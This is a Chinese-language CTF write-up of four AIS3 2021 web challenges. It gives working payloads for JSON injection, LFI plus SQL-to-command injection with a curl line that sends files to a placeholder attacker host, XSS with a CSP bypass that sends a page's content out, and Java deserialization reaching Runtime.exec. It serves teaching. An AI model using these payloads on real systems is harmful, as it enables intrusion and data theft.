# AIS3 2021 Pre-Exam [Web]

## 前言

作為教育性質較高的一場比賽，出題的時候算是有盡可能涵蓋每一種類型的技術/漏洞，LFI, SQL injection, command injection, deserialization, front-end security 都有涵蓋到了；順帶一提，這場還有一個 SSRF 題但不是我出的 XD

不過礙於題數限制，還是有一些有趣或常見的東西沒辦法出到，例如 prototype pollution、SSTI、XXE 以及一些 language features (e.g. weak type) 等等的，不熟的話可以自己去試著玩看看 > <

另外，在構思題目時是以不要有單純 copy paste payload 或太 script kiddie 的題目為主來發想的；而預期上單一類別最低分的題目解題數是期望至少要能超過 75 人次（因為錄取人數為 75 人），這點看來算有達成目標（？）

## ⲩⲉⲧ ⲁⲛⲟⲧⲏⲉꞅ 𝓵ⲟ𝓰ⲓⲛ ⲣⲁ𝓰ⲉ

- Category: Web
- Difficulty: Baby 👶
- Solves: 116/328
- Keywords: JSON injection

這題的定位是**零基礎題**。我的零基礎指的是已具備程式能力，但沒有認真的網站開發經驗，也沒 Web security 基礎知識。

具體目標算是希望透過這題測驗出玩家對 (Web) security 和 code auditing 是否有一定的天賦技能點 XD

### Solution

這個網頁會在 `/login` 時把使用者提供的 username, password 拼接進去 json 字串並將其設為 session，之後若通過 `valid_user` (`users_db.get(user['username']) == user['password']`) 以及 `user['showflag'] == true` 兩個條件便能取得 flag。因為是用直接拼接使用者輸入的方法處理 json 字串，之後才改為 `json.loads` 載入 session，這導致了很明顯的注入問題，使得我們能任意地竄改 session 的內容。

首先可以把 `showflag` 蓋成 `true` 便能通過 `user['showflag'] == True` 的測試

再透過 

1. Python `dict.get(key)` 若 key 不存在時會回傳 None 的特性
2. `json.loads(null) == None` 的特性

以上兩點結合即可繞過 `valid_user` 的檢查

範例：

```python
users_db = {"guest": "guest", "admin": "secret"}
def valid_user(user):
    return users_db.get(user['username']) == user['password'] # users_db.get("X") == user['password'] == None
user = json.loads('{"username": "X", "password": null}') # user = {"username": "X", password: None}
print(valid_user(user)) # True
```

最後綜合以上，可以構造出以下的 payload

- Username: `guest` 和 `admin` 以外的任意字串

- Password: 

  ````
  ", "showflag": true, "password": null, "xxx": "
     |---------------| |---------------| |-------
        覆蓋showflag      繞過valid_user   閉合後面的東西
  ````

如此一來就會把 session 改成這樣的內容：

>  {"showflag": false, "username": "**doesn't_exist**", "password": "  **", "showflag": true, "password": null, "x": "**  "}

接著便會成功看到 flag 了，讚

話說這題最大的坑點應該是，如果你 json 構壞掉（e.g. 順手戳了一個雙引號）整個網頁就會 500 給你看，要清 cookie 才能解決 XDD

## 【5/22 重要公告】

- Category: Web
- Difficulty: Easy
- Solves: 26/328
- Keywords: LFI, SQL injection, Command injection

定位就只是平凡無奇的老梗漏洞組合包而已⋯⋯吧？

出的時候以為是普通水題，還在猜測這和前面一題 login page 哪個會比較多人解，結果解題人數意外的少 QQ

### Overview

- 根據 http response header 中有 `X-Powered-By: PHP/7.4.19`，藉此可以判斷出是用 php 開發的
- 一進去會先去 fetch `/?module=modules/api` 抓出所有題目清單
- 點擊 check 按鈕會去 `/?module=modules/api&id=<CHALLENGE_ID>` 抓該題目服務的存活狀態

### Solution

#### TL;DR

1. LFI to leak source code: `/?module=php://filter/convert.base64-encode/resource=modules/api`
2. sqli + cmdi -> RCE: `/?module=modules/api&id=-1 union select 1,"';curl%09http://attacker_host/$(cat%09/*);'",3--` (%09 means `"\t"` / tab, use for avoiding whitespace)
3. Get flag!

#### Step 1: LFI

`/?module=modules/api` 的 module 參數明顯的是一個路徑，很可能會有 LFI 的問題，這部分為了怕各位通靈不到我還特別用 `modules/api` 的格式而非 `api` XD

我們可以簡單的實驗驗證這個猜想：

```
/?module=modules/api			-> success
/?module=modules/./api 			-> success
/?module=modules/../modules/api	-> success
/modules/						-> 403
/modules/api.php				-> success（或許需要有點經驗或通靈，但就算不知道這點也足夠進行下一步驟了）
```

接著，根據[隨便都能查到的 LFI 的經典套路](https://google.com/search?q=LFI+CTF)，可以發現能用 `/?module=php://filter/convert.base64-encode/resource=modules/api` 讀到 base64 encode 過的原始碼，當然也可以用 `string.rot13` 之類的，反正都是一樣的意思。

以上這部分都是真・老梗，剛剛翻了一下發現 AIS3 2015、2017、2019 都有出過幾乎一模一樣的東西。話說這樣算起來 `php://filter` 讀原始碼的梗好像只會在奇數年會出現，奇妙的知識增加了欸這到底什麼規律 = =

總之，接下來就能直接讀原始碼了。以下是 `modules/api.php` 的原始碼：

```php
<?php
header('Content-Type: application/json');

include "config.php";
$db = new SQLite3(SQLITE_DB_PATH);

if (isset($_GET['id'])) {
    $data = $db->querySingle("SELECT name, host, port FROM challenges WHERE id=${_GET['id']}", true);
    $host = str_replace(' ', '', $data['host']);
    $port = (int) $data['port'];
    $data['alive'] = strstr(shell_exec("timeout 1 nc -vz '$host' $port 2>&1"), "succeeded") !== FALSE;
    echo json_encode($data);
} else {
    $json_resp = [];
    $query_res = $db->query("SELECT * FROM challenges");
    while ($row = $query_res->fetchArray(SQLITE3_ASSOC)) $json_resp[] = $row;
    echo json_encode($json_resp);
}
```
從以上的 code 可以發現他的 database 是用 SQLite，且 db 路徑是從 `SQLITE_DB_PATH` 這個常數讀取的，那這個常數定義在哪呢？最上面有 include 一個可疑的 `config.php`，再次用 `php://filter` 套路讀取內容後可以得知路徑是 `challenges.db`，而這個檔案可以直接從網站輕鬆下載：http://quiz.ais3.org:8001/challenges.db

#### Step 2: SQL Injection

```php
$data = $db->querySingle("SELECT name, host, port FROM challenges WHERE id=${_GET['id']}", true);
```
這行 code 可以看出 id 參數中有明顯的 SQL injection 洞，最簡單的利用方式是用 union-based 去進行注入，payload 上大致長這樣
```
http://quiz.ais3.org:8001/
?module=modules/api
&id=0 union select "chal_name","example.com", "port_num"--
```
由於在前一步根本已經能下載到完整的 database 了（`challenges.db`），想看資料直接載下來即可，完全不用在此花時間去慢慢注入撈資料（事實上裏面也沒什麼有價值的東西），繼續觀察 SQL injection 能造成什麼更嚴重的危害吧！

#### Step 3: Command Injection

在前面的步驟已經達成了控制 SQL query 出來的 name、host 以及 port，那這樣能幹嘛呢？

```php
$data = $db->querySingle("SELECT name, host, port FROM challenges WHERE id=${_GET['id']}", true);
$host = str_replace(' ', '', $data['host']);
$port = (int) $data['port'];
$data['alive'] = strstr(shell_exec("timeout 1 nc -vz '$host' $port 2>&1"), "succeeded") !== FALSE;
```

先來完整的看一下前面提到的程式碼片段，可以發現從 SQL query 出來的 `host` 與 `port` 欄位都會被當作 command 的一部分串接進 `shell_exec` 的參數中，來簡單分析一下：

- `port` ：被強制轉型成 int 了所以沒辦法利用

- `host`：只對他做了移除空白字元的處理而已，最終仍是直接被串接進 command 裏執行

可以看出 `host` 有明顯的 command injection 問題存在。

總結一下，我們現在的目標是：要在 `timeout 1 nc -vz '$host' $port 2>&1` 的 host 變數中不用到空白字元注入任意指令。

然而其實不用空白字元相當簡單，在 sh 中你可以使用 `"\t"` (tab) 或 `$IFS` 取代空白，或是用類似  `{cat,/flag}` 這種格式的指令，這些小技巧應該都能[簡單 Google 到](https://www.google.com/search?q=command+injection+without+whitespace)，所以只要把 host 注入成類似 `';cat\t/flag;'` 這樣的東西就能注入任意命令了！

最終 payload 如下：
```
http://quiz.ais3.org:8001/
?module=modules/api
&id=0 union select 1, "';curl%09http://attacker_host/$(cat%09/*);'", 3--
      ^               |-------------------------------------------|  
    union-based sqli           command injection in `host`
```

## XSS Me

- Category: Web
- Difficulty: Easy ~ Medium
- Solves: 5/328
- Keywords: XSS, CSP

這題除了 content security policy (CSP) 以外，其實是復現了我在 real world 遇到的一個場景，而且它原本的字數限制還比這題稍微嚴格一些 XD

這題雖然限制有些刁鑽，但所需要的知識僅僅是基礎 JavaScript 而已，並沒有太奇怪的專業技術（例如 利用 JavaScript 特殊特性、DOM clobbering、prototype pollution 等等），理論上對前端不陌生但沒太多 Web security 經驗的人是有能力解出來的——當然，還是需要腦筋急轉彎一下啦；另一方面，我猜想應該不少新手不瞭解或沒聽過 content security policy，因此有在題敘中特意註明此題有 CSP 並附上參考資料，貼心吧 (X)

### Overview

題目相當單純，背後邏輯可以化簡成這樣的虛擬碼：
```html
<script>
	const message = {{ json.dumps({ "icon": "info", "titleText": message[:55] }) }};
</script>
```
其中只有 message 內容能被使用者妥善控制，但有最多 55 個字元的字數限制。目標是要偷到 `/getflag` 頁面上的內容。

### Solution

#### TL;DR

- PoC 0x01:
    Use `location.hash` with `javascript:`.
    
    ```
    http://quiz.ais3.org:8003/
    ?message=</script><script>location=location.hash.slice(1)//
    #javascript:fetch('/getflag').then(function(r){return/**/r.text()}).then(function(r){location='http://attacker_host/'+r})
    ```
    
- PoC 0x02:
    Use pure `location` with `document.write`.
    
    ```
    http://quiz.ais3.org:8003/
    ?message=</script><script>document.write(decodeURI(location))//
    &</script><img src=x onerror=fetch('/getflag').then(function(r){return/**/r.text()}).then(function(r){location='http://attacker_host/'+r})><!--
    ```

#### Step 1: `alert(1)`

你各位 XSS 的第一步肯定是想先 alert 個東西出來吧，那麼，要怎麼執行出最簡單的 JavaScript 呢？

由於是一個黑箱題，大家會嘗試的第一步應該會是試著 escape 出雙引號的包圍，但由於這是 `json.dumps` 出來的結果所以並不可行。但應該還是能很快的發現它沒過濾掉 `>`, `<`, `/` 等特殊字元，所以只要用 `</script>` 閉合掉前面的 `<script>`，接著就能開始寫入任意的 HTML 了。

而要達成 alert(1) 最短的 payload 應該是這樣：`/?message=</script><script>alert(1)//`

這一步我猜大部分有認真看這題的人都有做到（？）

#### Step 2: Full XSS

message 字數限制一共 55 個字元，扣掉必備的`</script><script>` 以及結尾的 `//` 僅僅剩下 36 個字元可用，在這個限制之下，就算你有一個超短的 domain 也還是不可能做到讀取 `/getflag` 再把內容傳出去

這時候該做的思路**不是怎麼把 payload 塞到 55 個字元內**，而是要怎麼把 55 個字元擴展成無限！大致上的想法是，要找到瀏覽器中**是否有一個可以塞任意字串的變數**，接著去 eval 那個變數，目標就達成了

我手邊的幾種可用變數都跟網址有關，畢竟使用者能輕鬆操控、JavaScript 肯定需要存取的東西最容易想到的應該就是網址吧？

- document.URL / location（目前的完整網址）
- location.hash（網址中 #xxx 的部分）
- location.search (網址中 ?key=value&a=b 的部分)

以 `location.hash` 而言，可以用如下 payload。應該可以看得出來是取出 hash 後去掉開頭的 `#`，接著便直接拿去 eval 了。

`/?message=</script><script>eval(location.hash.slice(1))//#alert(1);/*more js here*/`

> 註：其實理論上還有 `window.name` 這個變數可以使用，但這題有限制提交的 XSS 網址必須是同源的因此不能簡單地應用於此。這邊給一個利用的範例：
>
> ```javascript
> // currently on http://attacker.site
> window.name = "payload"
> location = "http://victim.site" // 導向 victim.site 後仍會保留前面設定的 window.name
> ```
>
> 藉此特性其實還能想到一種進階一點的解法：```/?message=</script><script>location=`//attacker.site`//```
>
> 而 `http://attacker.site` 在設定完惡意的 `window.name` payload 後則再度導回此題 `/?message=</script><script>eval(name)//`，如此一來便能利用 `window.name` 達成目標。
>
> 但是這題 xss bot 一開始去登入的其實是 docker 內部設定的 `http://xss-me/` 而非 `http://quiz.ais3.org:8003/`，所以實際上還需要再透過一些技巧把 admin 實際訪問的網址撈出來（e.g. referer），算是一個小 bug （？

#### Step 3: Bypassing CSP

這題設定的 CSP 很簡單，把 `default-src` 設成 `'self'`，並允許 inline script 的執行。

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline';">
```

我設計這個 CSP 的用意有兩點

1. 告訴大家 Content Security Policy 這種東西的存在
2. 限制不能使用 eval （啟用 CSP 後需要特別添加 `'unsafe-eval'` 的規則才會被准許使用 eval）

不能用 eval 其實很好解決，首先第一種解法可以利用 JavaScript scheme。

我想大家多少都會看過 JavaScript scheme 這種東西。簡單來說就是如果一個連結是 `javascript:` 開頭，則後面接的東西會被當成 js 執行，例如向 `javascript:alert(1)` 對瀏覽器而言就是一個合法的連結。這個技巧在所謂的「瀏覽器書籤小工具」很常見，或是早期的網頁設計上也可以見到大家常會使用 `<a href="javascript:void(0)">` 來代表連結無效。

而使用 ` javascript:` 執行 js 是不會被目前 CSP 阻擋的——進一步的來說，它已經被 `'unsafe-inline'` 允許了——因此現在只需要把當前網址導向到一個 `javascript:alert(1)...` 之類的網址，就能達成類似 eval 的效果了！

總之，我們可以把 `eval(location.hash.slice(1))//#alert(1)` 替換成 `location=location.hash.slice(1)//#javascript:alert(1)` 便能繞過 CSP 的限制達成目標。

如果不使用 `location=javascript:...`，這邊也提供第二種解法。其實也可以用 `document.write` 直接寫 HTML 的方法來達成類似的目的：`document.write(decodeURI(location))//&<img src=x onerror="alert(1)...">`，這種行內 js 寫法也是被 `unsafe-inline` 允許的。

#### Step 4: Steal the Content

這部分就簡單了，普通的用 ajax 抓 `/getflag` 的內容，再傳到自己的 server 收 flag 就好。當然受制於 CSP，能傳送資料的方法只有很暴力的 redirect（`location = 'http://attacker.site/?'+flag`）而已

完整 payload 可以參考上方 TL;DR 的部分

## Cat Slayer <sup>Inverse</sup>

- Category: Web
- Difficulty: Easy ~ Medium
- Solves: 2/328
- Keywords: Java Deserialization, Reflection

這題解題人數最少，但應該是比前一題 `XSS Me` 還簡單的題目，只是我猜很多人都因為平時沒有看過 Java Web 而略過了這題 > <

出題時的構想是覺得這算是新手比較少碰觸的一塊，本來就不預期參賽者要有解題經驗或知識，因此主要測驗的點是能即時蒐集並應用知識的能力，讓大家邊做邊學，所以題目也沒進行複雜的包裝，考點呈現上比較像一題裸題。至於之所以選擇加入 reflection 是因為實際上大部分的 Java 反序列化場景都會和 reflection 機制有關，如果不考這個的話感覺回去考傳統 PHP 就好了 XD

### Solution

題目給的是一個 .war ，其本質上其實就只是一個 zip 而已，直接解壓縮就行，其中除了一些 .jsp 以外，還有 .class 檔也就是被編譯過後的 Java。因此第一步要做的肯定是把先反編譯那些 .class 以了解後端的邏輯，方法很多，甚至有線上工具可以用，我這邊就不贅述了。

總之，最明顯能看到的是在 `/WEB-INF/classes/com/controller/IndexController` 中有一個反序列化的點：

```java
@RequestMapping({"/summon.meow"})
public String hello(@RequestParam(value = "name",defaultValue = "(guest)") String username, @RequestParam(value = "num",defaultValue = "10") Integer num, @RequestParam(value = "token",required = false) String token, ModelMap model) throws Exception {
        if (token != null) {
            byte[] byteToken = Base64.getDecoder().decode(token);
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteToken));
            model.addAttribute("player", ois.readObject()); // <- 反序列化
            model.addAttribute("loadFromToken", 1);
        }
//    ...
```

可以看出它會載入 base64 編碼過後的 Java 序列化資料，那有哪些地方反序列化會有危害呢？（註：雖然 [ysoserial](https://github.com/frohoff/ysoserial) 上有兩條 `spring-core` 的鏈，但這題所使用的版本已經不能利用了）

實際的問題點在 `/WEB-INF/classes/com/cat/Maou` 的 `readObject` 方法

```java
this.DEMON_NAMES = (String[]) stream.readObject(); // 貓咪🐱候選名稱陣列
this.CAT_NAME_SETTER = (String) stream.readObject(); // 設定 Cat.name 的方法名稱
this.name = (String) stream.readObject();
this.cats = new ArrayList<>();

// 類似長這樣的陣列：["com.cat.BabyCat", "com.cat.SuperCat", ...] 
ArrayList<String> catClsStrings = (ArrayList<String>) stream.readObject(); 

for (String catCls : catClsStrings) {
    String[] parts = catCls.split("\\.");
    String typeName = parts[parts.length - 1];

    Class<?> cls = Class.forName(catCls); // 透過 class name（例如 "com.cat.BabyCat"）拿到 class 本體
    Method method = cls.getMethod(CAT_NAME_SETTER, String.class); // 拿到該 class 的 CAT_NAME_SETTER 方法
    Constructor constructor = cls.getDeclaredConstructor(); 
    constructor.setAccessible(true);
    Object cat = constructor.newInstance(); // 生出一個 instance
    method.invoke(cat, genCatName() + "-" + typeName); // 呼叫前面拿到的 CAT_NAME_SETTER 方法
    				// ^^^ genCatName 是從 DEMON_NAMES 裡隨機挑一個字串出來
    this.cats.add((Cat) cat);
}
```

直接講結論，我們可以用如下的程式碼取得 `java.lang.Runtime.exec`，藉此執行任意指令

```java
Class cls = Class.forName("java.lang.Runtime");
Method method = cls.getMethod("exec", String.class);
constructor.setAccessible(true);
Object obj = constructor.newInstance();
method.invoke("ls -al");
```

回推到上面 `Maou` 的  `readObject` 方法，應該就能很清楚的知道要怎麼設定每個值了

```java
private void writeObject(java.io.ObjectOutputStream stream) throws IOException {
    String[] DEMON_NAMES = { "bash -c ... " };
    stream.writeObject(DEMON_NAMES);
    stream.writeObject("exec"); // this.CAT_NAME_SETTER
    stream.writeObject("meowmeow..."); // this.name

    ArrayList<String> catsClass = new ArrayList<>();
    catsClass.add("java.lang.Runtime");
    stream.writeObject(catsClass);
}
```

這邊有一個小問題，由於 `java.lang.Runtime.exec` 並不是直接呼叫 `/bin/sh` 之類的東西，而是直接用空白字元切 token，再把每一個 token 作為 argv 塞回去，所以不能用任何 shell 的語法。這點可以用 `bash -i [CMD]` 來解決，但後面的 CMD 部分仍然不能有任何空白。好像有很多人卡在這邊找不到解法，但其實很容易能 Google 到有人已經幫我們寫好工具了：http://jackson-t.ca/runtime-exec-payloads.html

最後的最後，我們就能來生成序列化物件了！

這部分還有一個點要注意，那便是 Java 反序列化時會檢查序列化物件的 `serialVersionUID` 是否和伺服器端的 class 一樣，若不一樣則不會繼續反序列化，那要怎麼拿到這個值呢？以這題來說最暴力的方法是隨便序列化一個 `Maou` 丟上去，伺服器便會噴錯告訴你正確的 serialVersionUID 了；正規一點的做法也可以用 [SerializationDumper](https://github.com/NickstaDB/SerializationDumper) dump 出伺服器端給的序列化物件的 `serialVersionUID`。

```shell
$ java -jar SerializationDumper.jar -r serialized.txt

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 12 - 0x00 0c
        Value - com.cat.Maou - 0x636f6d2e6361742e4d616f75
      serialVersionUID - 0x28 f8 b1 85 79 c3 89 dc  <======= [serialVersionUID found!]
      newHandle 0x00 7e 00 00
      ...
```

完整 exploit 可以參考[這邊](./cat-slayer-inverse/exploit/)
